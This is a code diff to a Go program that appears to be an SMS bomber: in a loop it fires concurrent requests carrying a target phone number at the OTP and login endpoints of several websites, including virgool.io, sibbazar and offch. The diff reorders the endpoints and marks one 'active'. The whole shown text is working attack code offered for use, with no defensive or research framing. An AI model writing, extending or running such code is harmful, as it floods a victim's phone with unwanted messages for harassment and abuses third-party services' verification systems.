@@ -108,7 +108,11 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
-		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+		
+		go sms("https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
+			"username": phone,
+		}, ch)  // active ✅
+                go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
 			"identifier": phone,
 		}, ch)   // add site
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
@@ -497,9 +501,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.offch.com/login", map[string]interface{}{
 			"1_username": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
-			"username": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
 			"mobile": phone,
